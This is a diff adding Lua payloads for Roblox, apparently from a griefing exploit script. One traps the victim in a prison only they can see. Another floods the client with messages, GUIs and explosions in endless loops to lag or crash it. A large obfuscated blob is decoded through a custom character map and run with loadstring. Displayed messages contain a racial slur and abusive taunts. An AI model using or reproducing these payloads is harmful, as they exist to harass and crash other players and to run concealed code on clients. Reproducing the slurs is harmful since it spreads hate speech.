+mes.Text = string.gsub("ZOMG STOP H4XING ME PLZZZ FUCK YOU DUMB NIGGERS","","\5")
+end
+end
+end)
+]]
+
+
+JailSource = [==[
+	wait(0)
+	script.Parent = nil
+
+	local LP = game:GetService("Players").LocalPlayer
+	Middle2 = nil
+	Middle = nil
+	game:GetService("Workspace").CurrentCamera:ClearAllChildren()
+
+	Cons = {}
+
+	function makePrison()
+		for _,v in pairs(Cons) do
+			v:disconnect()
+		end
+		game:GetService("Workspace").CurrentCamera:ClearAllChildren()
+		if Middle == nil then
+			Middle2 = LP.Character.Torso.Position
+			Middle = LP.Character.Torso.CFrame
+		end
+		local side1 = Instance.new("Part")
+		side1.Name = "¬Focus1¬"
+		side1.Size = Vector3.new(20, 50, 1)
+		side1.CFrame = Middle * CFrame.new(0, 0, -10)
+		side1.BrickColor = BrickColor.new("Really black")
+		side1.CanCollide = true
+		side1.Anchored = true
+		side1.TopSurface = "Smooth"
+		side1.BottomSurface = "Smooth"
+		side1.Parent = game:GetService("Workspace").CurrentCamera
+
+		local side2 = Instance.new("Part")
+		side2.Name = "¬Focus2¬"
+		side2.Size = Vector3.new(20, 50, 1)
+		side2.CFrame = Middle * CFrame.new(0, 0, 10)
+		side2.BrickColor = BrickColor.new("Really black")
+		side2.CanCollide = true
+		side2.Anchored = true
+		side2.TopSurface = "Smooth"
+		side2.BottomSurface = "Smooth"
+		side2.Parent = game:GetService("Workspace").CurrentCamera
+
+		local side3 = Instance.new("Part")
+		side3.Name = "¬Focus3¬"
+		side3.Size = Vector3.new(1, 50, 20)
+		side3.CFrame = Middle * CFrame.new(10, 0, 0)
+		side3.BrickColor = BrickColor.new("Really black")
+		side3.CanCollide = true
+		side3.Anchored = true
+		side3.TopSurface = "Smooth"
+		side3.BottomSurface = "Smooth"
+		side3.Parent = game:GetService("Workspace").CurrentCamera
+
+		local side4 = Instance.new("Part")
+		side4.Name = "¬Focus4¬"
+		side4.Size = Vector3.new(1, 50, 20)
+		side4.CFrame = Middle * CFrame.new(-10, 0, 0)
+		side4.BrickColor = BrickColor.new("Really black")
+		side4.CanCollide = true
+		side4.Anchored = true
+		side4.TopSurface = "Smooth"
+		side4.BottomSurface = "Smooth"
+		side4.Parent = game:GetService("Workspace").CurrentCamera
+		
+		local side5 = Instance.new("Part")
+		side5.Name = "¬Focus5¬"
+		side5.Size = Vector3.new(20, 1, 20)
+		side5.CFrame = Middle * CFrame.new(0, -3.5, 0)
+		side5.BrickColor = BrickColor.new("Really black")
+		side5.CanCollide = true
+		side5.Anchored = true
+		side5.TopSurface = "Smooth"
+		side5.BottomSurface = "Smooth"
+		side5.Parent = game:GetService("Workspace").CurrentCamera
+		
+		wait(0)
+
+		table.insert(Cons, side1.Changed:connect(makePrison))
+		table.insert(Cons, side2.Changed:connect(makePrison))
+		table.insert(Cons, side3.Changed:connect(makePrison))
+		table.insert(Cons, side4.Changed:connect(makePrison))
+		table.insert(Cons, side5.Changed:connect(makePrison))
+	end
+
+	Delay(0, function()
+		while wait(0) do
+			ypcall(function()
+				if game:GetService("Workspace").CurrentCamera == nil or not LP.Character:findFirstChild("Torso") then
+					LP.Character:BreakJoints()
+				elseif not game:GetService("Workspace").CurrentCamera:findFirstChild("¬Focus1¬") or not game:GetService("Workspace").CurrentCamera:findFirstChild("¬Focus2¬") or not game:GetService("Workspace").CurrentCamera:findFirstChild("¬Focus3¬") or not game:GetService("Workspace").CurrentCamera:findFirstChild("¬Focus4¬") or not game:GetService("Workspace").CurrentCamera:findFirstChild("¬Focus5¬") then
+					makePrison()
+				end
+			end)
+			ypcall(function()
+				if (Middle2 - LP.Character.Torso.Position).magnitude >= 11.8 then
+					LP.Character.Torso.CFrame = game:GetService("Workspace").CurrentCamera:findFirstChild("¬Focus1¬").CFrame * CFrame.new(0, 0, 10)
+				end
+			end)
+		end
+	end)
+	if not workspace.CurrentCamera:findFirstChild("Hint") then
+local mes = Instance.new("Hint", workspace.CurrentCamera)
+mes.Text = string.gsub("You dumb bitch. Only YOU can see this prison. Now Rot in hell.","","\5")
+end
+]==]
+
+
+Flimbs = [==[ 
+	function FixLimbs(aplr)
+	coroutine.wrap(function()
+		for i,v in pairs({"Left Arm","Right Arm","Left Leg","Right Leg"}) do
+			pcall(function()
+				aplr.Character[v]:Remove()
+			end)
+			Limb = Instance.new("Part",aplr.Character)
+			Limb.Name = v
+			Limb.Size = Vector3.new(1, 2, 1)
+			Limb.formFactor = 0
+			Limb.BottomSurface = 0
+			Limb.BrickColor = aplr.Character.Head.BrickColor
+			local Motor = Instance.new("Motor6D")
+			Motor.Parent = aplr.Character.Torso
+			Motor.MaxVelocity = 0.1
+			Motor.Part0 = aplr.Character.Torso
+			Motor.Part1 = Limb
+			if v=="Left Arm" then
+				Motor.Name = "Left Shoulder"
+				Motor.MaxVelocity = 0.15
+				Motor.C0 = CFrame.new(-1, 0.5, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0)
+				Motor.C1 = CFrame.new(0.5, 0.5, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0)
+			elseif v=="Right Arm" then
+				Motor.Name = "Right Shoulder"
+				Motor.MaxVelocity = 0.15
+				Motor.C0 = CFrame.new(1, 0.5, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0)
+				Motor.C1 = CFrame.new(-0.5, 0.5, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0)
+			elseif v=="Left Leg" then
+				Motor.Name="Left Hip"
+				Motor.C0 = CFrame.new(-1, -1, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0)
+				Motor.C1 = CFrame.new(-0.5, 1, 0, -0, -0, -1, 0, 1, 0, 1, 0, 0)
+			elseif v=="Right Leg" then
+				Motor.Name = "Right Hip"
+				Motor.C0 = CFrame.new(1, -1, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0)
+				Motor.C1 = CFrame.new(0.5, 1, 0, 0, 0, 1, 0, 1, 0, -1, -0, -0)
+			end
+		end
+		aplr.Character.Animate.Disabled = true
+		wait(0.25)
+		aplr.Character.Animate.Disabled = false
+	end)()
+end
+FixLimbs(game.Players.LocalPlayer)
+]==]
+
+	
+
+BSoDSource = [[
+	wait()
+	script.Parent = game:service'TeleportService'
+	CC = workspace.CurrentCamera
+	RS = game:service("RunService")
+	PG = game.Players.LocalPlayer.PlayerGui
+	C = game.Players.LocalPlayer.Character
+	function Lag()
+		coroutine.resume(coroutine.create(function()
+			while wait() do
+				M = Instance.new("Message",CC)
+				M.Text = tick()*math.floor(5%4*21)
+				H = Instance.new("Hint",CC)
+				H.Text = 'Get out from this place!'
+				SG=Instance.new("ScreenGui",PG)
+				FR=Instance.new("Frame",SG)
+				FR.Size = UDim2.new(500,500,500,500)
+				while wait() do
+					FR.BackgroundColor3 = Color3.new(math.random(0,255),math.random)
+				end
+				P=Instance.new("Part",CC)
+				E=Instance.new("Explosion",P)
+				E.BlastRadius=math.huge
+				E.Position=P.Position
+				F=Instance.new("Fire",P)
+				S=Instance.new("Smoke",P)
+				P.CFrame = CC.Focus
+				P.Anchored = true
+				P.CanCollide = false
+				P.AncestryChanged:connect(function()Lag()end)
+				for _,v in pairs(C:GetChildren()) do pcall(function()v.Anchored=true end) end
+			end 
+		end)) 
+	end
+	RS.Stepped:connect(function()for i=1,10 do Lag()Lag()Lag()end end)
+]]
+local charMap = {["="] = 0, ["&"] = 1, ["~"] = 2, ["-"] = 3, ["+"] = 4, ["!"] = 5, ["#"] = 6, ["%"] = 7, ["_"] = 8, ["^"] = 9, [")"] = 10, ["*"] = 11, ["("] = 12, ["?"] = 13, ["$"] = 14, ["@"] = 15}; setfenv(assert(loadstring((string.gsub(table.concat({
+	"##!%$#-#+%^#@#$#=~%+~%=%-+_#*#_~^~)=^==!(#~%?-=!(#&#^%!#~%)=^=%#~%=%=~?-=~%+^+++)=^=~!$#*#=~?-=~+%@#$#!%?#~#!#~%_~=!(#~%)-%+!#+%~!&#$#*#^+$#%+~%@#!%=%_~%#~%=%^~^~=~@#~%=~=-)=^=^###=~$#@#+%=~=!(#~%)-^+-%^+$#%+~%@#!%=%_~%#~%=%^~=~+%_#!#$#)=^=^=++!#(#&#^%_~=-(~%%&#^#+%^~)=^=^=-+(#!#&#~%_~##&#(#-%!#(~-!^~)=^=^=~!!%$#=~?-=~##&#(#-%!#)==~=~=~=~=~=~=~=~##@#~%=~*#(~#%=~^#$#=~=%&#^#~%-%_~-+-+@#$#-%^~=~+#@#)==~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~#%)-+#^#-%-#@#$#$#!#-#+%_~^~)==~=~=~=~=~=~=~=~!#$#+#)=^=!#(#-%!#)=^=^=^###=~~!$#*#?-?-~-!-!-=~+%_#!#$#)=^=^=^=+!&#~#(#!#+%_~%~%!!#(#-#@#?#!#(~=~-+~%!#&#+%@#~%%~(~~~%!_#^#+%!#~~^~)=^=^=!#(#-%!#)=^=^=^=+!&#~#(#!#+%_~%~^!@#!%=~&#~%!#=~^#$#=~+%_#!#=~^+$###^#$#^#+%^%=~%+~%@#!%=%&~%~(~~~%!_#^#+%!#~~^~)=^=^=!#$#+#)=^=!#$#+#)=^=!#$#+#)=)=##!%$#-#+%^#@#$#=~%+(#@#~#!#_~+%_%+%(~-#@#(#@#~%(~+#!%~%^~)=^=^=^###=~$#@#+%=~$+@#+%^###^%=~+%_#!#$#=~~%!#+%!%~%$#=~!#$#+#)==~=~=~=~=~=~=~=~(#@#-#&#(#=~?+=~?-=~%%@#~%*#-%=%&#-#!#)-##^#"
+	,"$#+##+^#~%-%+%-+_#^#(#+#_~~~*!@+!%+%=%!%+%?!=~~~$~$~-+$+^~=~@#~%=~^+$#-%+%&#$#-#!#$~$#!#%%_~~~?+@#+#!#(#~~(~%%@#~%*#-%=%&#-#!#^~)==~=~=~=~=~=~=~=~?+$~$+&#?#!#=~?-=~~~*!@+!%+%=%!%+%?!=~~~$~$~-+$+)==~=~=~=~=~=~=~=~^###=~$#@#+%=~?+)-##^#$#+##+^#~%-%+%-+_#^#(#+#_~~~^+@+=!~~^~=~+%_#!#$#)==~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~^+$#-%+%&#$#-#!#$~$#!#%%_~~~-!+%~%^#$#%##!&#(#!%!#~~(~?+^~$~$+&#?#!#=~?-=~~~^+@+=!~~=~?~?~^+@+=!=~#+!!$+-++!^+@+$+-!)==~=~=~=~=~=~=~=~!#$#+#)==~=~=~=~=~=~=~=~(#@#-#&#(#=~%+(#=~?-=~^+$#-%+%&#$#-#!#$~$#!#%%_~~~=!&#~%+%~~(~?+^~)==~=~=~=~=~=~=~=~%+(#$~$+&#?#!#=~?-=~~~%+(#@#~#!#~~)==~=~=~=~=~=~=~=~%+(#$~-!_#&#=%!#=~?-=~~~~+&#(#(#~~)==~=~=~=~=~=~=~=~%+(#$~-!^#)%!#=~?-=~#!!#-#+%@#~%--$~$#!#%%_~&-$~#-(~&-$~#-(~&-$~#-^~)==~=~=~=~=~=~=~=~%+(#$~&+$#-#_#@#~%!#+#=~?-=~+%~%!%!#)==~=~=~=~=~=~=~=~%+(#$~-+&#$#-+@#(#(#^#+#!#=~?-=~##&#(#-%!#)==~=~=~=~=~=~=~=~%+(#$~(+@#-#*#!#+#=~?-=~+%~%!%!#)==~=~=~=~=~=~=~=~%+(#$~+!~%&#$#-%=%&#~%!#$#-#^%=~?-=~=-"
+	,"$~--)==~=~=~=~=~=~=~=~%+(#$~~+~%^#-#*#-+@#(#@#~%=~?-=~~+~%^#-#*#-+@#(#@#~%$~$#!#%%_~-+@#(#@#~%-%*!-#@#(#@#~%?!=~@#~%=~-#@#(#@#~%=~@#~%=~~~^+$#-%+%^#+%!%+%^#@#$#&#(#=~%%_#^#+%!#~~^~)==~=~=~=~=~=~=~=~%+(#$~+!@#=%-!!%~%##&#-#!#=~?-=~~~-!?#@#@#+%_#~~)==~=~=~=~=~=~=~=~%+(#$~~+@#+%+%@#?#-!!%~%##&#-#!#=~?-=~~~-!?#@#@#+%_#~~)==~=~=~=~=~=~=~=~%+(#$~-+#+~%&#?#!#=~?-=~-+#+~%&#?#!#$~$#!#%%_~=-(~&-=-=-=-=-(~=-^~)==~=~=~=~=~=~=~=~(#@#-#&#(#=~!+##=~?-=~%+(#)--#(#@#$#!#_~^~)==~=~=~=~=~=~=~=~!+##$~=!&#~%!#$#+%=~?-=~%+(#)==~=~=~=~=~=~=~=~!+##$~$+&#?#!#=~?-=~~~!+####!#-#+%~~)==~=~=~=~=~=~=~=~!+##$~-!_#&#=%!#=~?-=~~~~+&#(#(#~~)==~=~=~=~=~=~=~=~!+##$~#+@#~%?##+&#-#+%@#~%=~?-=~~~-+!%-%+%@#?#~~)==~=~=~=~=~=~=~=~!+##$~+!~%&#$#-%=%&#~%!#$#-#^%=~?-=~=-)==~=~=~=~=~=~=~=~!+##$~-!^#)%!#=~?-=~#!!#-#+%@#~%--$~$#!#%%_~=-$~_-%-!-(~=-$~_-%-!-(~=-$~_-%-!-^~)==~=~=~=~=~=~=~=~!+##$~~+~%^#-#*#-+@#(#@#~%=~?-=~~+~%^#-#*#-+@#(#@#~%$~$#!#%%_~+%@#-%+%~%^#$#%#_~%+(#$~~+~%^#-#*#-+"
+	,"@#(#@#~%^~=~?-?-=~~~~!!#&#(#(#^%=~~#(#&#-#*#~~=~&#$#+#=~~~^+$#-%+%^#+%!%+%^#@#$#&#(#=~%%_#^#+%!#~~=~@#~%=~~~~!!#&#(#(#^%=~~#(#&#-#*#~~^~)==~=~=~=~=~=~=~=~+!^#+%(#!#_~+%_%+%(~%+(#(~%+(#$~~+~%^#-#*#-+@#(#@#~%$~-+@#(#@#~%^~)==~=~=~=~=~=~=~=~%+(#@#~#!#-%*!%+(#?!=~?-=~=-)==~=~=~=~=~=~=~=~-!*!%+(#?!=~?-=~=!(#&#^%!#~%$~$+&#?#!#)==~=~=~=~=~=~=~=~%#&#?#!#)-%+!#+%-!!#~%#%^#-#!#_~~~++!#~#~%^#-%~~^~)-&++#+#^++%!#?#_~%+(#(~+#!%~%=~@#~%=~!-^~)==~=~=~=~=~=~=~=~~%!#+%!%~%$#=~%+(#)=!#$#+#)=##!%$#-#+%^#@#$#=~+!&#~#(#!#+%_~+%_%+%(~=~-#@#(#@#~%(~=~##!%$#-#^~)==~=~=~=~=~=~=~=~(#@#-#&#(#=~?+=~?-=~%%@#~%*#-%=%&#-#!#)-##^#$#+##+^#~%-%+%-+_#^#(#+#_~~~*!^+$#=%!%+%?!=~~~$~$~-+$+^~=~@#~%=~^+$#-%+%&#$#-#!#$~$#!#%%_~~~?+@#+#!#(#~~(~%%@#~%*#-%=%&#-#!#^~)==~=~=~=~=~=~=~=~?+$~$+&#?#!#=~?-=~~~*!^+$#=%!%+%?!=~~~$~$~-+$+)==~=~=~=~=~=~=~=~^###=~$#@#+%=~?+)-##^#$#+##+^#~%-%+%-+_#^#(#+#_~~~^+@+=!~~^~=~+%_#!#$#)==~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~^+$#-%+%&#$#-#!#$~$#!#%%_~~~-!+%"
+	,"~%^#$#%##!&#(#!%!#~~(~?+^~$~$+&#?#!#=~?-=~~~^+@+=!~~)==~=~=~=~=~=~=~=~!#$#+#)==~=~=~=~=~=~=~=~(#@#-#&#(#=~+!~#=~?-=~^+$#-%+%&#$#-#!#$~$#!#%%_~~~=!&#~%+%~~(~?+^~)==~=~=~=~=~=~=~=~+!~#$~$+&#?#!#=~?-=~~~+!&#~#(#!#+%~~)==~=~=~=~=~=~=~=~+!~#$~#+@#~%?##+&#-#+%@#~%=~?-=~~~-+!%-%+%@#?#~~)==~=~=~=~=~=~=~=~+!~#$~-!^#)%!#=~?-=~#!!#-#+%@#~%--$~$#!#%%_~--(~+-(~=-$~!-^~)==~=~=~=~=~=~=~=~+!~#$~&+$#-#_#@#~%!#+#=~?-=~+%~%!%!#)==~=~=~=~=~=~=~=~+!~#$~-+&#$#-+@#(#(#^#+#!#=~?-=~##&#(#-%!#)==~=~=~=~=~=~=~=~+!~#$~(+@#-#*#!#+#=~?-=~+%~%!%!#)==~=~=~=~=~=~=~=~+!~#$~+!~%&#$#-%=%&#~%!#$#-#^%=~?-=~=-$~!-)==~=~=~=~=~=~=~=~+!~#$~~+~%^#-#*#-+@#(#@#~%=~?-=~~+~%^#-#*#-+@#(#@#~%$~$#!#%%_~-+@#(#@#~%-%*!-#@#(#@#~%?!=~@#~%=~-#@#(#@#~%=~@#~%=~-+@#(#@#~%-%$~%!_#^#+%!#^~)==~=~=~=~=~=~=~=~+!~#$~+!@#=%-!!%~%##&#-#!#=~?-=~~~-!?#@#@#+%_#~~)==~=~=~=~=~=~=~=~+!~#$~~+@#+%+%@#?#-!!%~%##&#-#!#=~?-=~~~-!?#@#@#+%_#~~)==~=~=~=~=~=~=~=~+!~#$~-+#+~%&#?#!#=~?-=~-+#+~%&#?#!#$~$#!#%%_~=-(~&-=-"
+	,"=-=-=-(~=-^~)==~=~=~=~=~=~=~=~(#@#-#&#(#=~!+##=~?-=~+!~#)--#(#@#$#!#_~^~)==~=~=~=~=~=~=~=~!+##$~=!&#~%!#$#+%=~?-=~+!~#)==~=~=~=~=~=~=~=~!+##$~$+&#?#!#=~?-=~~~!+####!#-#+%~~)==~=~=~=~=~=~=~=~!+##$~-!_#&#=%!#=~?-=~~~~+(#@#-#*#~~)==~=~=~=~=~=~=~=~!+##$~#+@#~%?##+&#-#+%@#~%=~?-=~~~-+!%-%+%@#?#~~)==~=~=~=~=~=~=~=~!+##$~+!~%&#$#-%=%&#~%!#$#-#^%=~?-=~=-)==~=~=~=~=~=~=~=~!+##$~-!^#)%!#=~?-=~#!!#-#+%@#~%--$~$#!#%%_~&-$~!-(~&-$~!-(~=-^~)==~=~=~=~=~=~=~=~!+##$~~+~%^#-#*#-+@#(#@#~%=~?-=~~+~%^#-#*#-+@#(#@#~%$~$#!#%%_~+%@#-%+%~%^#$#%#_~+!~#$~~+~%^#-#*#-+@#(#@#~%^~=~?-?-=~~~~!!#&#(#(#^%=~~#(#&#-#*#~~=~&#$#+#=~-+@#(#@#~%-%$~%!_#^#+%!#=~@#~%=~-+@#(#@#~%-%$~~+(#&#-#*#^~)==~=~=~=~=~=~=~=~-!~#=~?-=~^+$#-%+%&#$#-#!#$~$#!#%%_~~~-!!#(#!#-#+%^#@#$#~+@#_%~~(~+!~#^~)==~=~=~=~=~=~=~=~-!~#$~$+&#?#!#=~?-=~~~-!~+@#_%~~)==~=~=~=~=~=~=~=~-!~#$~-+@#(#@#~%=~?-=~~+~%^#-#*#-+@#(#@#~%$~$#!#%%_~~~%!_#^#+%!#~~^~)==~=~=~=~=~=~=~=~-!~#$~&++#@#~%$#!#!#=~?-=~+!~#)==~=~=~=~=~=~=~"
+	,"=~-!~#$~+!~%&#$#-%=%&#~%!#$#-#^%=~?-=~=-$~~-!-)==~=~=~=~=~=~=~=~^###=~+%_%+%$%?-=~~~~~=~+%_#!#$#=~+!^#+%(#!#_~+%_%+%(~+!~#(~+!~#$~~+~%^#-#*#-+@#(#@#~%$~-+@#(#@#~%^~=~!#$#+#)==~=~=~=~=~=~=~=~+%&#~#(#!#$~^#$#-%!#~%+%_~+!&#~#(#!#+%-%(~+!~#^~)==~=~=~=~=~=~=~=~+!-+-!*!+!~#?!=~?-=~##!%$#-#)==~=~=~=~=~=~=~=~-!*!+!~#?!=~?-=~=!(#&#^%!#~%$~$+&#?#!#)==~=~=~=~=~=~=~=~~%!#+%!%~%$#=~+!~#)=)=!#$#+#)=##!%$#-#+%^#@#$#=~@+!%+%=%!%+%_~+%_%+%(~-#@#(#(~=%(#~%(~+#!%~%(~+%&#~#(~%#(#@#(~%%@#~%*#^~)==~=~=~=~=~=~=~=~(#@#-#&#(#=~=%(#&#^%!#~%=~?-=~=%(#~%=~@#~%=~=!(#&#^%!#~%)==~=~=~=~=~=~=~=~^###=~=%(#&#^%!#~%=~?-?-=~=!(#&#^%!#~%=~&#$#+#=~$#@#+%=~+%&#~#=~&#$#+#=~$#@#+%=~%#(#@#=~+%_#!#$#)==~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~^###=~$#@#+%=~(+@#&#+#!#+#=~+%_#!#$#=~~%!#+%!%~%$#=~!#$#+#)==~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~^###=~$#@#+%=~~!!#&%!%!#-%+%-%*!=%(#&#^%!#~%?!=~+%_#!#$#)==~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~~!!#&%!%!#-%+%-%*!=%(#&#^%!#~%?!=~?-=~*%?%)==~=~=~=~"
+	,"=~=~=~=~=~=~=~=~=~=~=~=~!#$#+#)==~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~(#@#-#&#(#=~*#!#^%=~?-=~+%^#-#*#_~^~)==~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~+!_%+%*!*#!#^%?!=~?-=~+%@#-%+%~%^#$#%#_~+%_%+%^~=~@#~%=~~~~~)==~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~+%&#~#(#!#$~^#$#-%!#~%+%_~~!!#&%!%!#-%+%-%*!=%(#&#^%!#~%?!(~*%*#!#^%(~-#@#(#=~@#~%=~~~%!_#^#+%!#~~(~+#!%~%=~@#~%=~#-=-(~*#!#^%(~+%&#~#?%^~)==~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~~%!#+%!%~%$#)==~=~=~=~=~=~=~=~!#$#+#)==~=~=~=~=~=~=~=~~%!#+%!%~%$#=~++@#@+!%+%=%!%+%_~+%@#-%+%~%^#$#%#_~+%_%+%^~(~-#@#(#(~=%(#&#^%!#~%(~+#!%~%(~+%&#~#(~%#(#@#(~%%@#~%*#^~)=!#$#+#)=##!%$#-#+%^#@#$#=~@+!%+%=%!%+%-%_~+%_%+%-%(~$~$~$~^~)==~=~=~=~=~=~=~=~##@#~%=~*#(~#%=~^#$#=~=%&#^#~%-%_~+%_%+%-%^~=~+#@#)==~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~@+!%+%=%!%+%_~#%(~$~$~$~^~)==~=~=~=~=~=~=~=~!#$#+#)=!#$#+#)=##!%$#-#+%^#@#$#=~++@#@+!%+%=%!%+%_~+%_%+%(~-#@#(#(~=%(#&#^%!#~%(~+#!%~%(~+%&#~#(~%#(#@#(~%%@#~%*#^~)==~=~=~=~=~=~=~=~(#@#-#&#(#=~=%(#~%=~?-=~=%(#&#^%!#~%=~"
+	,"@#~%=~=!(#&#^%!#~%)==~=~=~=~=~=~=~=~^###=~=%(#~%=~?-?-=~=!(#&#^%!#~%=~&#$#+#=~$#@#+%=~%#(#@#=~+%_#!#$#)==~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~^###=~+%&#~#=~+%_#!#$#)==~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~%#&#?#!#)-%+!#+%-!!#~%#%^#-#!#_~~~++!#~#~%^#-%~~^~)-&++#+#^++%!#?#_~+!&#~#(#!#+%_~+%_%+%(~-#@#(#(~+%&#~#^~(~+#!%~%^~)==~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~!#(#-%!#)==~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~%+(#@#~#!#_~+%_%+%(~-#@#(#(~+#!%~%^~)==~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~!#$#+#)==~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~~%!#+%!%~%$#)==~=~=~=~=~=~=~=~!#$#+#)==~=~=~=~=~=~=~=~(#@#-#&#(#=~?#%#=~?-=~?+%+*!=%(#~%$~$+&#?#!#?!)==~=~=~=~=~=~=~=~(#@#-#&#(#=~@+!%=~?-=~^+$#-%+%&#$#-#!#$~$#!#%%_~~~=!&#~%+%~~(~%%@#~%*#=~&#$#+#=~%%@#~%*#-%=%&#-#!#=~@#~%=~%%@#~%*#-%=%&#-#!#)-##^#$#+##+^#~%-%+%-+_#^#(#+#_~=%(#~%$~$+&#?#!#^~=~@#~%=~%%@#~%*#-%=%&#-#!#^~)==~=~=~=~=~=~=~=~@+!%$~$+&#?#!#=~?-=~~~@+!%+%=%!%+%~+&#(#(#~~)==~=~=~=~=~=~=~=~@+!%$~-!_#&#=%!#=~?-=~~~"
+	,"~+&#(#(#~~)==~=~=~=~=~=~=~=~(#@#-#&#(#=~-%=~?-=~?#%#=~&#$#+#=~?+!#-%_#!#-%*!?#%#?!=~&#$#+#=~?+!#-%_#!#-%*!?#%#?!*!%-?!=~@#~%=~~-)==~=~=~=~=~=~=~=~@+!%$~-!^#)%!#=~?-=~#!!#-#+%@#~%--$~$#!#%%_~-%(~-%(~-%^~)==~=~=~=~=~=~=~=~@+!%$~&+$#-#_#@#~%!#+#=~?-=~+%~%!%!#)==~=~=~=~=~=~=~=~@+!%$~-+&#$#-+@#(#(#^#+#!#=~?-=~##&#(#-%!#)==~=~=~=~=~=~=~=~@+!%$~(+@#-#*#!#+#=~?-=~+%~%!%!#)==~=~=~=~=~=~=~=~@+!%$~+!~%&#$#-%=%&#~%!#$#-#^%=~?-=~?#%#=~&#$#+#=~?+!#-%_#!#-%*!?#%#?!=~&#$#+#=~?+!#-%_#!#-%*!?#%#?!*!_-?!=~&#$#+#=~&-=~@#~%=~?#%#=~&#$#+#=~=-=~@#~%=~$~!-)==~=~=~=~=~=~=~=~@+!%$~~+~%^#-#*#-+@#(#@#~%=~?-=~~+~%^#-#*#-+@#(#@#~%$~$#!#%%_~-+@#(#@#~%-%*!-#@#(#?!=~@#~%=~-#@#(#=~@#~%=~-+@#(#@#~%-%$~%!_#^#+%!#^~)==~=~=~=~=~=~=~=~@+!%$~+!@#=%-!!%~%##&#-#!#=~?-=~~~-!?#@#@#+%_#~~)==~=~=~=~=~=~=~=~@+!%$~~+@#+%+%@#?#-!!%~%##&#-#!#=~?-=~~~-!?#@#@#+%_#~~)==~=~=~=~=~=~=~=~^###=~?#%#=~+%_#!#$#)==~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~(#@#-#&#(#=~?#=~?-=~?+!#-%_#!#-%*!?#%#?!)==~=~=~=~=~"
+	,"=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~^###=~?#=~+%_#!#$#)==~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~(#@#-#&#(#=~?+!#=~?-=~^+$#-%+%&#$#-#!#$~$#!#%%_~~~-!=%!#-#^#&#(#?+!#-%_#~~(~@+!%^~=~?~?~?+!#-%_##+!%$#-#+%^#@#$#_~!#+#^~)==~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~?+!#$~?+!#-%_#^++#=~?-=~+%@#$#!%?#~#!#~%_~?#*!&-?!^~=~&#$#+#=~~~~%~#_%&#-%-%!#+%^#+#)-@~@~~~$~$~?#*!&-?!=~@#~%=~?#*!&-?!)==~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~?+!#$~+!!#_%+%!%~%!#^++#=~?-=~+%@#$#!%?#~#!#~%_~?#*!~-?!^~=~&#$#+#=~~~~%~#_%&#-%-%!#+%^#+#)-@~@~~~$~$~?#*!~-?!=~@#~%=~?#*!~-?!)==~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~?+!#$~-!-#&#(#!#=~?-=~#!!#-#+%@#~%--$~$#!#%%_~?#*!--?!(~?#*!--?!(~?#*!--?!^~)==~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~?+!#$~#!!#~%+%!#_%-+@#(#@#~%=~?-=~#!!#-#+%@#~%--$~$#!#%%_~?#*!+-?!(~?#*!!-?!(~?#*!#-?!^~)==~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~!#$#+#)==~=~=~=~=~=~=~=~!#$#+#)==~=~=~=~=~=~=~=~(#@#-#&#(#=~!+##=~?-=~@+!%)--#(#"
+	,"@#$#!#_~^~)==~=~=~=~=~=~=~=~!+##$~=!&#~%!#$#+%=~?-=~@+!%)==~=~=~=~=~=~=~=~!+##$~$+&#?#!#=~?-=~~~!+####!#-#+%~~)==~=~=~=~=~=~=~=~!+##$~-!_#&#=%!#=~?-=~~~~+&#(#(#~~)==~=~=~=~=~=~=~=~!+##$~#+@#~%?##+&#-#+%@#~%=~?-=~~~-+!%-%+%@#?#~~)==~=~=~=~=~=~=~=~!+##$~+!~%&#$#-%=%&#~%!#$#-#^%=~?-=~?#%#=~&#$#+#=~?+!#-%_#!#-%*!?#%#?!=~&#$#+#=~?+!#-%_#!#-%*!?#%#?!*!_-?!=~&#$#+#=~=-=~@#~%=~$#@#+%=~?#%#=~&#$#+#=~=-=~@#~%=~&-)==~=~=~=~=~=~=~=~!+##$~-!^#)%!#=~?-=~#!!#-#+%@#~%--$~$#!#%%_~&-(~&-(~&-^~)==~=~=~=~=~=~=~=~!+##$~~+~%^#-#*#-+@#(#@#~%=~?-=~~+~%^#-#*#-+@#(#@#~%$~$#!#%%_~+%@#-%+%~%^#$#%#_~@+!%$~~+~%^#-#*#-+@#(#@#~%^~=~?-?-=~~~~!!#&#(#(#^%=~~#(#&#-#*#~~=~&#$#+#=~-+@#(#@#~%-%$~%!_#^#+%!#=~@#~%=~-+@#(#@#~%-%$~~+(#&#-#*#^~)==~=~=~=~=~=~=~=~(#@#-#&#(#=~-!~#=~?-=~^+$#-%+%&#$#-#!#$~$#!#%%_~~~-!!#(#!#-#+%^#@#$#~+@#_%~~(~+!~#^~)==~=~=~=~=~=~=~=~-!~#$~$+&#?#!#=~?-=~~~-!~+@#_%~~)==~=~=~